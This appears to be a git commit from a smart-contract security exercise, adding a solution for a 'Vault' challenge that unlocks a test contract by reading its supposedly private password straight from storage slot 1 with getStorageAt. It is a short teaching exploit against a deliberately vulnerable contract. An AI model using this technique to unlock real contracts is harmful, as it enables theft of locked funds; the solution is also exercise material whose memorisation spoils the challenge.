6223718afaace6a5a6cc4d5dada679955065460a
Vighnesh Rege <rege@fb.com>
2022-05-21 21:13:49 -0500

    Hacked 4th

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,8 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+  const provider = waffle.provider;
+  await victim.unlock(await provider.getStorageAt(victim.address, 1));
 };
 
 export default helper;
